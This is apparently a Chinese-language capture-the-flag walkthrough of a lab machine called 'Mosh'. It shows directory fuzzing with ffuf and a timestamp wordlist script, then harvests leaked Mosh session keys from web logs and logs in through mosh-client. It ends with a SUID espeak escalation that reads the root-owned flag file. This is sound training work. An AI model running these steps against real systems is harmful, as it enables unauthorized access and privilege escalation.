# 1.信息搜集

```bash
☁  ~  nmap -sVC -p- 192.168.3.52             
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-25 19:40 CST
Nmap scan report for 192.168.3.52
Host is up (0.0013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: 403 Forbidden
| http-robots.txt: 3 disallowed entries 
|_/admin/ /backup/ /*-logs/
MAC Address: 08:00:27:54:7B:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```bash
☁  ~  feroxbuster -u http://192.168.3.52
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.3.52/
 🚩  In-Scope Url          │ 192.168.3.52
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      146c http://192.168.3.52/backup
404      GET        7l       11w      146c http://192.168.3.52/admin
404      GET        7l       11w      146c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l        9w      146c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[####################] - 12s    30002/30002   0s      found:2       errors:0      
[####################] - 12s    30000/30000   2549/s  http://192.168.3.52/    
```

访问`http://192.168.3.52/robots.txt`
```
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /*-logs/
```

# 2. 漏洞发现与利用

https://www.doubao.com/thread/w3448713da0d0653c  介绍ffuf -Fuzz Faster U Fool
### 敏感文件发现
根据 `/*-logs/` 的提示，使用 `ffuf` 进行目录模糊匹配：
```bash
☁  ~  ffuf -u http://192.168.3.52/FUZZ-logs -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -fc 404


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.3.52/FUZZ-logs
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

mosh                    [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 4ms]
:: Progress: [56162/56162] :: Job [1/1] :: 3278 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
```
==**结果：** 发现目录 `/mosh-logs/`。==
> [!NOTE] Title
>  `-fc 404` : `--filter-code`
>  过滤指定 HTTP 状态码  过滤掉返回 404 的请求，仅显示 200（成功）、301/302（重定向）、403（权限禁止）等**有效状态码结果**，避免冗余输出，提升爆破效率


仍然没有显示，看来需要继续ffuf
![](images/Pasted%20image%2020260127211000.png)

```bash
☁  ~  ffuf -u http://192.168.3.52/mosh-logs/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -e .txt,.php,.log -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.3.52/mosh-logs/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 :: Extensions       : .txt .php .log 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

reminder                [Status: 200, Size: 37, Words: 2, Lines: 2, Duration: 14ms]
:: Progress: [224648/224648] :: Job [1/1] :: 2816 req/sec :: Duration: [0:01:36] :: Errors: 0 ::
```

读取 `reminder` 内容：
```
$(date +\%Y-\%m-\%d_\%H-\%M-\%S).log
```

**漏洞原理：** 这是一个提示，说明该目录下存在以时间戳命名的日志文件。格式为 `YYYY-MM-DD_HH-MM-SS.log`。

### 爆破日志文件名
由于目录不可直接列出（403），需要根据服务器当前时间爆破文件名。通过 HTTP Header 确认服务器时间为 GMT，但 Nmap 显示系统时区可能为 CST (GMT+8)。
> **中国标准时间**​ (China Standard Time)

```
curl -I http://192.168.3.52/mosh-logs/
HTTP/1.1 403 Forbidden
Server: nginx
Date: Tue, 27 Jan 2026 13:14:59 GMT
Content-Type: text/html
Content-Length: 146
Connection: keep-alive
```

编写 Python 脚本生成时间戳字典并进行爆破：
```python
# gen_wordlist.py
import datetime
start = datetime.datetime(2026, 1, 27, 21, 0, 0) # 对应 CST 时间
end = datetime.datetime(2026, 1, 27, 22, 0, 0)
step = datetime.timedelta(seconds=1)
current = start
while current <= end:
    print(current.strftime('%Y-%m-%d_%H-%M-%S.log'))
    current += step
```
执行爆破：
```bash
python3 gen_wordlist.py > time_wordlist.txt
ffuf -u http://192.168.43.224/mosh-logs/FUZZ -w time_wordlist.txt -fc 404
```

```bash
☁  mosh  ffuf -u http://192.168.3.52/mosh-logs/FUZZ -w word_list.txt -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.3.52/mosh-logs/FUZZ
 :: Wordlist         : FUZZ: /root/localkali/mytarget/mosh/word_list.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

2026-01-27_21-00-00.log [Status: 200, Size: 374, Words: 45, Lines: 10, Duration: 25ms]
2026-01-27_21-01-00.log [Status: 200, Size: 125, Words: 17, Lines: 4, Duration: 8ms]
2026-01-27_21-02-00.log [Status: 200, Size: 374, Words: 45, Lines: 10, Duration: 50ms]
2026-01-27_21-03-00.log [Status: 200, Size: 125, Words: 17, Lines: 4, Duration: 29ms]
2026-01-27_21-04-00.log [Status: 200, Size: 374, Words: 45, Lines: 10, Duration: 13ms]
2026-01-27_21-06-00.log [Status: 200, Size: 374, Words: 45, Lines: 10, Duration: 7ms]
2026-01-27_21-07-00.log [Status: 200, Size: 125, Words: 17, Lines: 4, Duration: 15ms]
2026-01-27_21-05-00.log [Status: 200, Size: 125, Words: 17, Lines: 4, Duration: 162ms]
2026-01-27_21-08-00.log [Status: 200, Size: 374, Words: 45, Lines: 10, Duration: 36ms]
2026-01-27_21-09-00.log [Status: 200, Size: 125, Words: 17, Lines: 4, Duration: 2ms]
2026-01-27_21-10-00.log [Status: 200, Size: 374, Words: 45, Lines: 10, Duration: 5ms]
2026-01-27_21-11-00.log [Status: 200, Size: 125, Words: 17, Lines: 4, Duration: 1ms]
2026-01-27_21-12-00.log [Status: 200, Size: 374, Words: 45, Lines: 10, Duration: 2ms]
2026-01-27_21-13-00.log [Status: 200, Size: 125, Words: 17, Lines: 4, Duration: 4ms]
2026-01-27_21-14-00.log [Status: 200, Size: 374, Words: 45, Lines: 10, Duration: 13ms]
2026-01-27_21-16-00.log [Status: 200, Size: 374, Words: 45, Lines: 10, Duration: 26ms]
2026-01-27_21-15-00.log [Status: 200, Size: 125, Words: 17, Lines: 4, Duration: 57ms]
2026-01-27_21-17-00.log [Status: 200, Size: 125, Words: 17, Lines: 4, Duration: 33ms]
2026-01-27_21-18-00.log [Status: 200, Size: 374, Words: 45, Lines: 10, Duration: 18ms]
2026-01-27_21-19-00.log [Status: 200, Size: 125, Words: 17, Lines: 4, Duration: 16ms]
2026-01-27_21-20-00.log [Status: 200, Size: 374, Words: 45, Lines: 10, Duration: 7ms]
2026-01-27_21-21-00.log [Status: 200, Size: 125, Words: 17, Lines: 4, Duration: 6ms]
2026-01-27_21-22-00.log [Status: 200, Size: 374, Words: 45, Lines: 10, Duration: 14ms]
:: Progress: [3601/3601] :: Job [1/1] :: 3174 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```
**成功发现日志文件：** 例如 `2026-01-27_21-00-00.log`,可以看到日志都是以分结尾的

# 3.获取 Mosh 密钥

读取发现的日志文件：
```
curl http://192.168.3.52/mosh-logs/2026-01-27_21-00-00.log
```

**日志内容：**
```bash
MOSH CONNECT 60001 3AIPfX2xyFgIjkby89Dusw

mosh-server (mosh 1.4.0) [build mosh 1.4.0]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 2981]
```

**关键信息：**
- Mosh 端口: `60001` (UDP)
- Mosh 密钥: `NU7fS6rZ653j7Zo2iRDbPA`
### 动态获取 Mosh 密钥
Mosh 密钥在 HTTP 日志中以明文形式存在，但有效期极短（约1分钟）。如果连接失败，需要扫描最新的日志文件获取新密钥。

**扫描最近日志的命令 (示例):**
```bash
# 扫描 21:20 到 21:30 的日志，寻找 MOSH CONNECT 记录
for m in $(seq -w 20 30); do 
    curl -s --raw http://192.168.3.52/mosh-logs/2026-01-27_21-$m-00.log | grep 'MOSH CONNECT'
done
```

> [!NOTE] 解释
> - `seq -w 20 30`：生成**20 到 30 的连续数字，且补零为固定两位**（`-w`=width，补零对齐），输出：`20 21 22 23 24 25 26 27 28 29 30`；
> - `--raw`**原始输出模式**强制 curl 以**原始二进制 / 文本格式**返回日志内容，**不解析任何响应头 / 格式**（避免 curl 将日志误判为 HTML/JSON 而解析变形，保证日志内容完整）


结果：
```bash
MOSH CONNECT 60001 8juuu73hgZWVqGYkKGY6pg
MOSH CONNECT 60001 HA8P0M4IVRF5mwN0MgalRg
MOSH CONNECT 60001 kcxCHRz1hAwKKr3XAEtyDA
MOSH CONNECT 60001 6IxWNy6/RJHOLPmvBCuf3w
MOSH CONNECT 60001 Gxl5qB/sXV9x5+M9eMJ4PQ
```
选择最后一个最新的，
### mosh登录
利用获取到的密钥，可以通过 `mosh-client` 直接连接到靶机。 命令格式：
```bash
MOSH_KEY=NU7fS6rZ653j7Zo2iRDbPA mosh-client 192.168.3.52 60001
```
### SSH 陷阱与绕过

通过 `SSH` 直接连接 `mosh@192.168.3.52` 时，会遭遇 "ncurses 乱码/闪烁" 界面，实际上是一个受限的 TUI 程序 (Trap)，无法获得交互式 Shell。 Mosh (Mobile Shell) 使用 UDP 协议，可以绕过 SSH 的伪终端限制，直接连接到服务器端的 Mosh 进程，从而获得正常的 Shell。

# 4.登录与提权

```bash
Mosh:~$ cat user.txt 
flag{user-3862995f666ac41681befb81b89a0103}
```

## 提权
```bash
Mosh:~$ find / -perm -u=s 2>/dev/null
/bin/bbsuid
/usr/bin/espeak
```

https://gtfobins.org/gtfobins/espeak/
![](images/Pasted%20image%2020260127214651.png)

```bash
Mosh:~$ /usr/bin/espeak -qXf /root/root.txt > res.txt
#将res.txt传到kali本地
Mosh:~$ scp res.txt root@192.168.3.53:/root/localkali/mytarget/mosh/.
```

查看结果
```
☁  mosh  cat res.txt               
Unpronouncable? 'flag'
 39     _) f (L01Y [f]

Translate 'flag'
  1     f        [f]
 39     _) f (L01Y [f]

  1     l        [l]

  1     a        [a]

  1     g        [g]

Translate '{'

Found: '_{' [lEftbreIs]  
Translate 'root'
  1     r        [r]

 36     oo       [u:]
  1     o        [0]
  4     X) o     [0#]

  1     t        [t]

Flags:  a   $nounf
Translate 'a'
 40     _) a (_D [,eI]
  1     a        [a]
 26     _) a (_  [a#]

Found: '_9' [n'aIn]  
Found: 'e' [i:]  
Found: '_2X' [tw'Ent2i]  
Found: '_6' [s'Iks]  
Found: 'f' [Ef]  
Found: '_8X' ['eIti]  
Found: '_8' ['eIt]  
Flags:  a   $nounf
Translate 'a'
 40     _) a (_D [,eI]
  1     a        [a]
 26     _) a (_  [a#]
 45     D_) a (_ [eI]

Found: '_4X' [f'o@ti]  
Found: '_9' [n'aIn]  
Found: 'f' [Ef]  
Found: '_5X' [f'Ifti]  
Found: '_4' [f'o@]  
Translate 'ce'
  1     c        [k]
 22     c (e     [s]

  1     e        [E]
 45     XC) e (_N [i:]

Found: '_3' [Tr'i:]  
Translate 'fe'
  1     f        [f]

  1     e        [E]
 45     XC) e (_N [i:]

Found: '_2X' [tw'Ent2i]  
Found: '_9' [n'aIn]  
Flags:  a   $nounf
Translate 'a'
 40     _) a (_D [,eI]
  1     a        [a]
 26     _) a (_  [a#]
 45     D_) a (_ [eI]

Found: '_8' ['eIt]  
Found: 'b' [bi:]  
Found: '_9' [n'aIn]  
Found: 'f' [Ef]  
Found: '_8' ['eIt]  
Found: 'f' [Ef]  
Found: '_0C' [h'Vndr@d]  
Found: '_0M1' [T'aUz@nd]  
Found: '_3' [Tr'i:]  
Found: '_1' [w'02n]  
Found: '_0and' [@n]  
Found: '_3X' [T'3:ti]  
Found: '_3' [Tr'i:]  
Translate '}'

Found: '_}' [raItbreIs]  
 fl'ag_:_: r'u:t,eI n'aIn 'i: tw'Entis'Iks 'Ef 'eIti;'eIt 'eI f'o@tin'aIn 'Ef f'Iftif'o@ s'i: Tr'i: f'i: tw'Entin'aIn 'eI 'eIt b'i: n'aIn 'Ef 'eIt 'Ef Tr'i: T'aUz@nd w'0nh'Vndr@d@n T'3:tiTr'i:
```
将这些内容喂给AI，解析即可

`flag{root-a9e26f88a49f54ce3fe29a8b9f8f3133}`